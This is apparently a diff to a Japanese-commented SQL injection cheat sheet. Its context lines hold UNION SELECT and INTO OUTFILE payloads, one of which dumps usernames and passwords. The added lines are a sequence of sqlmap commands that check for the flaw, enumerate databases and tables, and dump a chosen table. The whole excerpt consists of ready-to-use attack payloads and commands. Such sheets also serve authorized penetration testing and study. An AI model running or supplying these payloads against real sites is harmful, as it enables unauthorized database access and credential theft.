@@ -62,3 +62,8 @@ UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM table
 //INTO OUTFILEでファイルに出力
 1' and 1=0 union select "<html>hoge</html>","","","" INTO OUTFILE "<パス>";-- -
 
+//Sqlmapで自動攻撃
+sqlmap -u "http://www.example.com/example.php?search=admin" #脆弱性があるか確認
+sqlmap -u "http://www.example.com/example.php?search=admin" --dbs #データベースの列挙
+sqlmap -u "http://www.example.com/example.php?search=admin" -D <DB_name> --tables #指定したデータベースのテーブルを列挙
+sqlmap -u "http://www.example.com/example.php?search=admin" -D <DB_name> -T <table_name> --dump #特定したテーブルを指定してダンプ
